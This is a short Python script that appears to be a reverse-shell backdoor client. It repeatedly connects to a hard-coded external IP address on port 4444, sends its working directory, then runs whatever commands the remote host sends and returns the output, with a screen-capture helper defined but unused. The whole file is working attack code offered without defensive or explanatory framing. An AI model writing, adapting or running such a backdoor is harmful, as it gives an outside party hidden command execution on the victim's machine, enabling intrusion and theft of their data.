import socket, os, sys, subprocess
from time import sleep
import autopy
def screenshot():
    bitmap = autopy.bitmap.capture_screen()
    return bitmap
sHost = "86.201.13.200"
sPort = 4444
bufferSize = 1024 * 128
separator = " "
isntConnected = True
s = socket.socket()
while isntConnected:
    try:
        print("1")
        s.connect((sHost, sPort))

        print("2")
        isntConnected = False
        print("3")
    except:
        print("4")
        continue
        print("5")

    print(6)




currentWorkingDirectory = os.getcwd()

s.send(currentWorkingDirectory.encode())

while True:
    cmd = s.recv(bufferSize).decode()
    splited_command = cmd.split()
    if cmd.lower() == "exit":
        break
    if splited_command[0].lower() == "cd":

        try:
            os.chdir(''.join(splited_command[1:]))
        except FileNotFoundError as e:
            output = str(e)
        else:
            output = ""
    else:
        output = subprocess.getoutput(cmd)

    currentWorkingDirectory = os.getcwd()
    message = f'{output}{separator}{currentWorkingDirectory}'
    s.send(message.encode())
s.close()